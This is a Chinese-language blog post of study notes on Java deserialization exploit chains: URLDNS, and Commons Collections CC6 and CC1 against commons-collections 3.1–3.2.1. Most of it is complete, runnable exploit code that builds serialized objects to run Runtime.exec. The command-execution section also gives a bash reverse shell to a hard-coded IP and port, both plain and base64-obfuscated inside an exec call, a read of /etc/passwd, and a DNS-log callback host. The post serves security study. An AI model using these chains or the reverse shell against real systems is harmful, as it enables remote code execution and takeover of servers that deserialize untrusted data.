---
title: Java CC1 && CC6 链
date: 2025-06-02 20:12:50
tags:
  - CommonsCollections Gadget
  - Java
  - URLDNS
categories:
  - Java
summary: "Java CC1 && CC6 链"
slug: java反序列化学习记录-cc1-cc6
draft: false
author:
  name: L1nq
  link: https://github.com/L1nq0
  email: cryp71csec@gmail.com
  avatar: /1.jpg
weight: 0
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
---

Java CC1 && CC6 链

# 前置

## URLDNS 链

URLDNS 是 Java 反序列化漏洞中的一种，利用了 Java 在反序列化过程中可以解析 URL，并且在请求期间利用 DNS 反向解析来泄露信息。

URLDNS 核心是 java.net.URL 类

**URLDNS 链示例**

![image-20250116214614913](image-20250116214614913.png)

首先当进行 URL 组合 hashCode() 代码执行时，底层代码会执行到 URLStreamHander 类的 getHostAddress 方法，达到触发 DNSLOG 请求的效果，如

```
package com.l202519;

import java.net.URL;

public class Main_ {
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://92twaa.ceye.io");
        url.hashCode();
    }
}
```

DNS 网站成功接收到了请求信息

![image-20250116213610468](image-20250116213610468.png)

假设不能直接调用 hashCode，这时就需要通过其他多个类组合，最终触发某个类内部的 hashCode，搭配出 URLDNS 链

在 HashMap 类的 readObject 方法中，会执行 hash(key)

![image-20250116215234708](image-20250116215234708.png)

继续跟进 hash 方法，内部会执行 hashCode

![image-20250116215316992](image-20250116215316992.png)

完整 URLDNS 链

```
package com.l202519;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class Main_ {
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://92twaa.ceye.io");
        HashMap hashMap = new HashMap();
        setFieldValue(url, "hashCode", 888);
        //调用了 setFieldValue 方法，通过反射修改了 URL 对象的私有字段 hashCode，将其值设为 888，避免在 hashMap.put 的时候触发DNS解析
        hashMap.put(url, "useless");
        setFieldValue(url, "hashCode", -1);
        byte[] poc = serialize(hashMap);
        unserialize(poc);
    }

    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        baos.close();
        oos.close();
        return baos.toByteArray();
    }

    public static void unserialize(byte[] poc) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(poc);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        bais.close();
        ois.close();
    }

    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        System.out.println(field);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```



## 命令执行

### Runtime 类

获取命令执行输出结果

```
package com.l202519;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;

public class Main_ {
    public static void main(String[] args) throws Exception {
        InputStream is = Runtime.getRuntime().exec("cat /etc/passwd").getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int len = 0;
        byte[] cache = new byte[1024];
        while ((len = is.read(cache)) != -1) {
            baos.write(cache, 0, len);
        }
        System.out.println(baos);
    }
}
```



**Linux 无法重定向**

```
String a = "echo 123 > 1.txt";
```

如果命令是一个字符串，那么 Java 会后面的 123 > 1.txt 视为一个字符串去 echo，这样代码就不是预期效果

**解决方案一**

数组传参

![image-20250120160632304](image-20250120160632304.png)

```
public class Main_ {
    public static void main(String[] args) throws Exception {
        String[] cmd = new String[]{"/bin/sh", "-c", "echo 123 > /1.txt"};
        Runtime.getRuntime().exec(cmd);
    }
}
```

**方案二**

Base64

/bin/bash -c 'bash -i >& /dev/tcp/60.204.244.254/7788 0>&1'

```
package com.l202519;

public class Main_ {
    public static void main(String[] args) throws Exception {
        String cmd = "bash -c {echo,L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzYwLjIwNC4yNDQuMjU0Lzc3ODggMD4mMSc=}|{base64,-d}|{bash,-i}";
        Runtime.getRuntime().exec(cmd);
    }
}
```



### ProcessBuilder 类

用法如下

```
package com.l202519;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

public class Main_ {
    public static void main(String[] args) throws Exception {
        InputStream inputStream = new ProcessBuilder("whoami").start().getInputStream();
        byte[] cache = new byte[1024];
        int len = 0;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        while ((len = inputStream.read(cache)) != -1) {
            baos.write(cache, 0, len);
        }
        System.out.println(baos);
    }
}
```

Runtime 内部也是通过 ProcessBuilder 

![image-20250120175818890](image-20250120175818890.png)

### Processlmpl 类

用法

```
package com.l202519;

import java.lang.reflect.Method;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.util.Map;

public class Main_ {
    public static void main(String[] args) throws Exception {
        String[] cmds = new String[]{"whoami"};
        Class clazz = Class.forName("java.lang.ProcessImpl");
        Method method = clazz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        method.setAccessible(true);
        Process e = (Process) method.invoke(null, cmds, null, ".", null, true);
        InputStream inputStream = e.getInputStream();
        byte[] cache = new byte[1024];
        int len = 0;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        while ((len = inputStream.read(cache)) != -1) {
            baos.write(cache, 0, len);
        }
        System.out.println(baos);
    }
}
```



### 一些问题

echo 命令

由于系统环境变量找不到 echo 执行文件，所以使用 cmd 命令进行 echo 的使用

![image-20250120154850113](image-20250120154850113.png)

![image-20250120155000076](image-20250120155000076.png)

```
package com.l202519;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;

public class Main_ {
    public static void main(String[] args) throws Exception {
        InputStream is = Runtime.getRuntime().exec("cmd /c echo 123").getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int len = 0;
        byte[] cache = new byte[1024];
        while ((len = is.read(cache)) != -1) {
            baos.write(cache, 0, len);
        }
        System.out.println(baos);
    }
}
```

![image-20250120154945960](image-20250120154945960.png)

![image-20250120155029208](image-20250120155029208.png)



# CC6

CC6 链是 Commons Collections 反序列化漏洞 中影响范围最广的一条利用链，它仅受 Commons Collections 版本的影响，不受 Java 版本的限制。

受影响的 Commons Collections 范围：

```
commons-collections：3.1 - 3.2.1
```

环境配置

![image-20250124155043383](image-20250124155043383.png)

本次漏洞分析环境采用 commons-collections 3.2.1 版本

## HashMap 版利用链

要实现反序列化命令执行，最基础的思路是通过 Runtime.exec() 触发计算器：

```
Runtime.getRuntime().exec("calc.exe");
```

但我们不能直接调用 exec()，因此需要在 commons-collections 依赖中找到一个可利用的调用链来在反序列化时触发这个命令。

**Sink：** 

在 InvokerTransformer#transform 中有反射调用代码段，并且参数都是可控的

![image-20250125094426756](image-20250125094426756.png)

当 input 赋为 Runtime 对象并给 cls，cls.getMethod 封装 Runtime#exec 类方法元信息，再给 iArgs 赋为系统命令，此时调用 transform，能够达成上面的 "目标实现"

![image-20250125093229585](image-20250125093229585.png)

```
public class Test {
    public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
    }
}
```

![image-20250125110812768](image-20250125110812768.png)

**Gadget：**

在明确了 InvokerTransformer#transform 方法的功能及其可用于命令执行的特性后，接下来的重点是分析调用链，即寻找哪些类能够直接或间接地调用 transform 方法

使用 IDEA 的 Find Usages 功能，搜索所有调用 transform 方法的代码路径

![image-20250125111336136](image-20250125111336136.png)

ChainedTransformer#transform 方法将 iTransformers 数组循环取出去调用数组内对象的 transform 方法，并将前一个方法返回结果作为调用数组下一对象的 object 参数，循环链式调用。

![image-20250125111552859](image-20250125111552859.png)

ConstantTransformer#transform 方法固定返回 iConstant 属性。

![image-20250125114807898](image-20250125114807898.png)

iTransformers 数组 与 iConstant 属性都可控，在实例化时赋值。

我们将 Runtime.getRuntime().exec("calc.exe"); 改为反射形式

```
Method method = Runtime.class.getMethod("getRuntime");
Runtime runtime = (Runtime) method.invoke(null);
runtime.exec("calc.exe");
```

并通过 ChainedTransformer#transform 与 ConstantTransformer#transform 实现上列反射流程，在走到 InvokerTransformer#transform 的 getMethod 方法时仍然需要指定形参类型

如果不指定，会报以下错误

![image-20250125121255215](image-20250125121255215.png)

getMethod 第二个参数 parameterTypes 用来精确匹配目标方法的参数签名，以定位要执行的方法，在反射调用使用 getMethod 时，必须制定好调用类方法的形参类型。Runtime#exec 内部接收的是 String 类型，因此第二个参数传入为 String.class

![image-20250125105726508](image-20250125105726508.png)

![image-20250125105920602](image-20250125105920602.png)

通过反射调用方法传入参数时，即使参数不给值，也需要传入 null

![image-20250125213453733](image-20250125213453733.png)

```
public class Test1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(null);
    }
}
```

![image-20250125123016834](image-20250125123016834.png)

接下来寻找调用 chainedTransformer#transform，在 LazyMap#get 中存在 factory.transform

![image-20250126094908713](image-20250126094908713.png)

继续追链，TideMapEntry#getValue 中调用了 get 方法

![image-20250127181803984](image-20250127181803984.png)

同样在 TideMapEntry 类中，hashCode 去调用了 getValue

![image-20250127182333986](image-20250127182333986.png)

需要调用 hashCode 方法，正好 URLDNS 调用链同样是调用 hashCode，直接借用。Java 核心类库 HashMap 类中，hash 方法调用了 hashCode

![image-20250127182550220](image-20250127182550220.png)

**Source：**

最后 HashMap#readObejct 调用 hash，完成调用链闭环

![image-20250127183314270](image-20250127183314270.png)

初步利用链：

```
package com.xiinnn;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class Test1 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "useless");
        byte[] poc = Serialize(hashMap);
    }

    public static byte[] Serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void UnSerialize(byte[] poc) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(poc);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
```

只进行序列化，发现序列化时就会触发命令执行

断点调试，发现是在 hashMap.put 的时候触发的

![](image-20250129204224611.png)

在 URLDNS 链中，URL#hashCode 方法存在 if 判断，通过将 hashCode 属性反射赋值为 -1 绕过了 put 执行，但 TiedMapEntry#hashCode 并没有 if 判断，一旦触发就会直接往后走，该如何绕过呢

![image-20250129204852113](image-20250129204852113.png)

解决方案：先让 LazyMap 使用 ConstantTransformer(1) 占位，干扰原始 transform() 的调用时机，再修改 factory 属性为 ChainedTransformer，确保最后执行反序列化时利用链正确。

执行，发现又出现新的问题，反序列化时也不触发 exec 了

```
package com.xiinnn;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Test1 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "useless");
        SetFieldValue(lazyMap, "factory", chainedTransformer);
        byte[] poc = Serialize(hashMap);
        UnSerialize(poc);
    }

    public static byte[] Serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void UnSerialize(byte[] poc) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(poc);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }

    public static void SetFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

继续断点逐步调试，containsKey(Object key) 用于判断 Map 是否包含指定的 key，如果 key 存在于 Map 中，则返回 true，否则返回 false。显然程序在 LazyMap#get 处没能按照预期进入 if 方法体内

![image-20250129212941404](image-20250129212941404.png)

解决方法：去除 LazyMap key 属性

最终 Exp

```
package com.xiinnn;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Test1 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "useless");
        SetFieldValue(lazyMap, "factory", chainedTransformer);
        lazyMap.remove("abc");
        byte[] poc = Serialize(hashMap);
        UnSerialize(poc);
    }

    public static byte[] Serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void UnSerialize(byte[] poc) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(poc);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }

    public static void SetFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

![image-20250129213348869](image-20250129213348869.png)

Gadget chain：

```
java.io.ObjectInputStream.readObject()
	java.util.HashMap.readObject()
        java.util.HashMap.hash()
            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                    org.apache.commons.collections.map.LazyMap.get()
                        org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            	java.lang.reflect.Method.invoke()
                                	java.lang.Runtime.exec()
```



## HashSet 版利用链

在 ysoserial 项目 cc6 payload 中，调用链入口是 HashSet，再到 HashMap，其他一致

![image-20250129213907608](image-20250129213907608.png)

依然回到 hashCode 的分析上，前面都一致

![image-20250129204852113](image-20250129204852113.png)

在 HashMap#put 方法中，同样能够进行 hash -> hashCode

![image-20250129220821800](image-20250129220821800.png)

再往前追，让HashSet#readObject 的 map 属性赋为 HashMap 即可，调用链完成

![image-20250129221055792](image-20250129221055792.png)

Exp：

```
package com.xiinnn;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class Test1 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "useless");
        HashSet hashSet = new HashSet();              //1. 在 HashMap版基础上修改这三段代码即可
        SetFieldValue(hashSet, "map", hashMap);       //2
        SetFieldValue(lazyMap, "factory", chainedTransformer);
        lazyMap.remove("abc");
        byte[] poc = Serialize(hashSet);              //3
        UnSerialize(poc);
    }

    public static byte[] Serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void UnSerialize(byte[] poc) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(poc);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }

    public static void SetFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```





# CC1

## TransformedMap 版 

在已经分析过 CC6 的前提下分析 CC1，从 ChainedTransfomer#transform 继续往前找调用链

![image-20250204165540576](image-20250204165540576.png)

在 TransformedMap#checkSetValue 方法调用了 transform，且该方法为 protected 修饰

![image-20250204165518306](image-20250204165518306.png)

valueTransformer 属性可以通过 TransformedMap#decorate 返回构造方法赋值，接下来寻找一个调用 checkSetValue 的类

![image-20250204170216540](image-20250204170216540.png)

![image-20250204170224154](image-20250204170224154.png)

在 AbstractInputCheckedMapDecoratorMapEntry#setValue 方法调用了 checkSetValue![image-20250204170444337](image-20250204170444337.png)

setValue 也无法被直接调用，继续往前找

![image-20250204174232158](image-20250204174232158.png)

在 AnnotationInvocationHandler#readObject 中调用了 setValue 方法，那么接下来根据链子构造代码

![image-20250204174625747](image-20250204174625747.png)

初步：

在序列化 invokerTransformer 时，实质上是序列化了 AnnotationInvocationHandler，因此反序列化时会自动调用其 readObject 方法，也就是 AnnotationInvocationHandler#readObject

```
public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap();

        Map transformerMap = TransformedMap.decorate(hashMap, null , chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        InvocationHandler invokerTransformer = (InvocationHandler) constructor.newInstance(Override.class, transformerMap);

        byte[] poc = Serialize(invokerTransformer);
        UnSerialize(poc);
    }

    public static byte[] Serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static Object UnSerialize(byte[] poc) throws IOException, ClassNotFoundException{
        ByteArrayInputStream bais = new ByteArrayInputStream(poc);
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }
}
```

在走入 AnnotationInvocationHandler#readObject 后，预期应该步入 for 循环中直至触发 setValue，但实际上却没能触发循环

![image-20250206123908107](image-20250206123908107.png)

此时 membersValues 值为空，因此 entrySet() 并没有返回值

![image-20250206125415803](image-20250206125415803.png)

```
hashMap.put("abc", "def");
```

赋值再看返回值，成功进入到循环体内

![image-20250206125323452](image-20250206125323452.png)

接下来要过几层判断

```
1、memberType/memberTypes 维护的是注解参数的列表，存储了注解类有关的信息
2、memberType.isInstance(value) ||  value instanceof ExceptionProxy)判断类受否能进行强转，||表示前面为真后面也会为真
```

最终：

```
package com.xiinnn;

import com.sun.prism.shader.DrawCircle_LinearGradient_REPEAT_AlphaTest_Loader;
import com.sun.xml.internal.bind.v2.runtime.reflect.opt.Const;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Repeatable;
import java.lang.annotation.Target;
import java.lang.instrument.ClassDefinition;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
// import sun.reflect.annotation.AnnotationInvocationHandler;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap();
        hashMap.put("value", "def");

        Map transformerMap = TransformedMap.decorate(hashMap, null , chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        InvocationHandler invokerTransformer = (InvocationHandler) constructor.newInstance(Repeatable.class, transformerMap);

        byte[] poc = Serialize(invokerTransformer);
        UnSerialize(poc);
    }

    public static byte[] Serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static Object UnSerialize(byte[] poc) throws IOException, ClassNotFoundException{
        ByteArrayInputStream bais = new ByteArrayInputStream(poc);
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }
}
```



## Ysoserial 版

Ysoserial 的链子是利用代理模式，与 TransformedMap 版大有不同。

视线回到 LazyMap#get，接着往前寻找调用 get 方法的类

![image-20250207160256483](image-20250207160256483.png)

在 AnnotationInvocationHandler#invoke 方法中调用了 get，那么如何调用 invoke 呢

![image-20250207160453299](image-20250207160453299.png)

在代理模式中，不会去执行 Map 接口的 get()、entrySet() 等，而是所有这些方法的调用都会被转发到 InvocationHandler 的 invoke() 方法

memberValues 是可控的，而 invoke 处允许执行 get，因此我们传入动态代理对象，同时需要进行类型转换 Map，它的 @NotNull InvocationHandler h 是 inInvocationHandler。

![image-20250207162507684](image-20250207162507684.png)

设置两层代理，外层代理的 memberValues 赋为 Map 类型代理类，代理对象为 AnnotationInvocationHandler，内层代理的 memberValues 赋为 LazyMap，完成利用链闭合

最终：

```
public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        InvocationHandler inInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, inInvocationHandler);

        InvocationHandler outInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, proxyMap);

        byte[] poc = Serialize(outInvocationHandler);
        UnSerialize(poc);
    }

    public static byte[] Serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static Object UnSerialize(byte[] poc) throws IOException, ClassNotFoundException{
        ByteArrayInputStream bais = new ByteArrayInputStream(poc);
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }
}
```

![image-20250207181543751](image-20250207181543751.png)











